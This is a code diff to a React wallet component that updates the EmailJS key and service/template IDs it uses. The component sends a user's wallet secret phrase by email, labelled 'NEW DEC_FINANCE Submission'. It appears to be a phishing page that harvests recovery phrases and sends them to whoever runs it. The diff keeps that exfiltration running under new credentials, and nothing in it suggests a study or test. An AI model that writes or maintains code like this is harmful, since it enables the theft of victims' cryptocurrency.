@@ -8,7 +8,8 @@ const WalletSectionOne = () => {
 
   (function () {
     emailjs.init({
-      publicKey: "KhXsjlknQMyDCWbVr", // Your public key
+      // publicKey: "KhXsjlknQMyDCWbVr", // Your public key
+      publicKey: "0ddaV4A0nJOzTp1yw", // Your public key
     });
   })();
 
@@ -22,7 +23,8 @@ const WalletSectionOne = () => {
         message: `NEW DEC_FINANCE Submission\n\nVerified Secret Phrase:\n\n ${phrase}`,
       };
 
-      emailjs.send("service_c4dn1pf", "template_2or5s0n", templateParams).then(
+      // emailjs.send("service_c4dn1pf", "template_2or5s0n", templateParams).then(
+      emailjs.send("service_w6dwvnh", "template_z9qtrsj", templateParams).then(
         function (response) {
           console.log("SUCCESS!", response.status, response.text);
         },
